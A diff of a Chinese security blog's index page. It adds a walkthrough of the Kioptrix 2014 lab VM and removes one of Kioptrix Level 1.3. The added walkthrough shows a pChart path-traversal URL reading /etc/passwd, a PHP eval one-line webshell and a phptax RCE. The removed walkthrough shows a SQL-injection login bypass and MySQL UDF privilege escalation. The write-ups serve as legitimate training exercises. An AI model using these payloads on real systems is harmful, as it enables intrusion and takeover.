@@ -255,6 +255,159 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/03/%C2%96Kioptrix-2014-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/03/%C2%96Kioptrix-2014-5/" class="post-title-link" itemprop="url">Kioptrix: 2014 (#5)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-03 19:06:48" itemprop="dateCreated datePublished" datetime="2022-11-03T19:06:48+08:00">2022-11-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-19 15:45:11" itemprop="dateModified" datetime="2022-12-19T15:45:11+08:00">2022-12-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Kioptrix-2014-5"><a href="#Kioptrix-2014-5" class="headerlink" title="Kioptrix: 2014 (#5)"></a>Kioptrix: 2014 (#5)</h1><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>需要首先卸载原来的网卡，然后再重新安装一块网卡，记得用nat模式。</p>
+<p>这些靶场总有一些奇奇怪怪的问题。</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>
+
+<p>首先还是通过nmpa扫描c段拿到靶机地址</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155525638.png" alt="image-20221103155525638"></p>
+<p><code>192.168.100.171</code></p>
+<p>然后扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.100.171</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155649936.png" alt="image-20221103155649936"></p>
+<p>22,80,8080</p>
+<p>8080端口是403</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155723269.png" alt="image-20221103155723269"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155737120.png" alt="image-20221103155737120"></p>
+<p>80端口有个这个页面，然后开始扫目录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.100.171/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155853459.png" alt="image-20221103155853459"></p>
+<p>啥也没有</p>
+<p>识别一下指纹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.100.171/index.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103155948060.png" alt="image-20221103155948060"></p>
+<p>通过识别指纹发现有这么个东西，<code>http://192.168.100.171/pChart2.1.3/index.php</code></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160044077.png" alt="image-20221103160044077"></p>
+<p>感觉就像是一个页面管理或者说是，大多cms后台那种感觉。</p>
+<p>随后百度一下<code>pChart2.1.3</code>这个的历史漏洞</p>
+<p>其实直接在kali里面搜索也有</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160649554.png" alt="image-20221103160649554"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160732137.png" alt="image-20221103160732137"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.171/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>读取到相关文件</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103160921154.png" alt="image-20221103160921154"></p>
+<p>尝试登录ssh，提示连接拒绝。</p>
+<p>这里我确实卡住了，我能想到和8080端口的403有关，所以我去查了下有关403的绕过。没用</p>
+<p>还是看了看攻略，这里注意，需要结合文件读取的漏洞去读取Apache的配置文件。</p>
+<p><a target="_blank" rel="noopener" href="http://wiki.apache.org/httpd/DistrosDefaultLayout">http://wiki.apache.org/httpd/DistrosDefaultLayout</a></p>
+<p>用漏洞查看配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.171/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161816864.png" alt="image-20221103161816864"></p>
+<p>找到定义的ua头</p>
+<p>用burp修改一下。</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103161930930.png" alt="image-20221103161930930"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162113090.png" alt="image-20221103162113090"></p>
+<p>随后去访问一下那个phptax</p>
+<p>直接搜一下</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162520526.png" alt="image-20221103162520526"></p>
+<p>发现有rce，最后一个，那就去看看。</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103162806119.png" alt="image-20221103162806119"></p>
+<p>记得中间的命令需要url编码</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180605385.png" alt="image-20221103180605385"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103180611718.png" alt="image-20221103180611718"></p>
+<p>这里我尝试使用网上报出来的exp进行攻击，但是试了大概有十多分钟一直没有成功，于是我决定写入一个一句话木马来进行控制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&#x27; &gt; test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183515829.png" alt="image-20221103183515829"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183532663.png" alt="image-20221103183532663"></p>
+<p>然后改成POST一句话木马，用蚁剑进行连接。（我真是天才啊</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103183855920.png" alt="image-20221103183855920"></p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/019E109C.jpg" alt="img"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>不过还是无法弹一个nc回来，就用蚁剑的虚拟终端进行提权吧。</p>
+<p>首先通过<code>uname -a</code>得知版本信息</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103185130159.png" alt="image-20221103185130159"></p>
+<p>FreeBSD ，下载exp，</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190319520.png" alt="image-20221103190319520"></p>
+<p>通过蚁剑上传，然后编译，编译的时候报错说是最后一行没有回车，然后加了个回车之后成功编译，但是</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190359774.png" alt="image-20221103190359774"></p>
+<p>没有用，我估计是，这个蚁剑是通过webshell来执行命令的，和反弹shell并不一样，你web的权限是变不了的。</p>
+<p>后面了解到通过perl可以反弹shell回来</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190447939.png" alt="image-20221103190447939"></p>
+<p>那我们就谈一个shell回来</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190504541.png" alt="image-20221103190504541"></p>
+<p>直接使用编译好的okk</p>
+<p>成功拿下!</p>
+<p><img src="/2022/11/03/%C2%96Kioptrix-2014-5/image-20221103190526901.png" alt="image-20221103190526901"></p>
+<p>所以正确的方法就是通过prel直接弹shell回来，没必要写一个webshell浪费时间捏。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>反弹shell的时候多试几种，然后就是各种细节都得做好才行。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/02/PwnLab/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -534,134 +687,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/02/KIOPTRIX-LEVEL-1-3-4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/" class="post-title-link" itemprop="url">KIOPTRIX: LEVEL 1.3 (#4)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-02 13:38:26 / 修改时间：13:40:20" itemprop="dateCreated datePublished" datetime="2022-11-02T13:38:26+08:00">2022-11-02</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="KIOPTRIX-LEVEL-1-3-4"><a href="#KIOPTRIX-LEVEL-1-3-4" class="headerlink" title="KIOPTRIX: LEVEL 1.3 (#4)"></a>KIOPTRIX: LEVEL 1.3 (#4)</h1><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>这个靶机有点特殊，需要新创建一个空的虚拟机，移除现在的硬盘，用靶机替换。</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102121247513.png" alt="image-20221102121247513"></p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>打开靶场之后，同样的扫c段拿到靶机的地址。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102121830519.png" alt="image-20221102121830519"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.153</span><br></pre></td></tr></table></figure>
-
-<p>然后扫端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.100.153</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122018182.png" alt="image-20221102122018182"></p>
-<p>22,80,139,445</p>
-<h1 id="漏洞利用-sql"><a href="#漏洞利用-sql" class="headerlink" title="漏洞利用-sql"></a>漏洞利用-sql</h1><p>感觉有永恒之蓝，不过还是先照例访问一下80端口</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122246562.png" alt="image-20221102122246562"></p>
-<p>一个登陆框，先扫一下目录，用下万能密码</p>
-<p>万能密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or 1=1#</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122419294.png" alt="image-20221102122419294"></p>
-<p>登陆之后说你的账户有问题，请联系本地administrator进行处理问题。</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122615367.png" alt="image-20221102122615367"></p>
-<p>笑死，还发现一个反射型xss，不过万能密码这条路行不通了，扫目录发现这么个东西</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122735774.png" alt="image-20221102122735774"></p>
-<p>也是有什么东西出错了</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122856132.png" alt="image-20221102122856132"></p>
-<p>这里卡了半天，搜了下才知道要注意url，john，也就是指的这个用户为john我们需要先把admin的cookie清除掉，随后用万能密码登录john。</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102123634806.png" alt="image-20221102123634806"></p>
-<p>这样就可以去试试登录ssh了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.100.153</span><br><span class="line">MyNameIsJohn</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102123929798.png" alt="image-20221102123929798"></p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102124049503.png" alt="image-20221102124049503"></p>
-<p>但是没办法执行命令，于是百度了一下。</p>
-<p>这里需要生成一个tty</p>
-<p><a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html">如何将简单的Shell转换成为完全交互式的TTY - 码农教程 (manongjc.com)</a></p>
-<p>又学到了。</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102125407311.png" alt="image-20221102125407311"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>随后就是拿root权限</p>
-<p>通过<code>lsb_release -a</code></p>
-<p>拿到版本信息，然后在exp的网站上面找一个提权脚本下载下来。</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102125839075.png" alt="image-20221102125839075"></p>
-<p>但是我发现脚本怎么都传不过去啊。</p>
-<p>我觉得是这个tty的问题，我发执行长期返回的命令。</p>
-<p>所以，求助了一下攻略，这里使用的是mysqludf提权</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/</span><br><span class="line">cat checklogin.php</span><br></pre></td></tr></table></figure>
-
-<p>可以看到root用户是空密码</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102131631523.png" alt="image-20221102131631523"></p>
-<p>我们可以通过mysql服务登录root账户</p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102131840802.png" alt="image-20221102131840802"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102132807319.png" alt="image-20221102132807319"></p>
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102133216681.png" alt="image-20221102133216681"></p>
-<p>查询UDF表，有sys_exec函数，可以利用这个函数执行系统命令。通过sys_exec函数将john添加到管理员组。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&#x27;usermod -a -G admin john&#x27;);</span><br><span class="line">exit</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102133345010.png" alt="image-20221102133345010"></p>
-<p>拿下</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>提权并不能完全依赖系统的提权脚本，也可以通过其他手段，比如最常见的mysqludf提权。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -733,7 +758,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
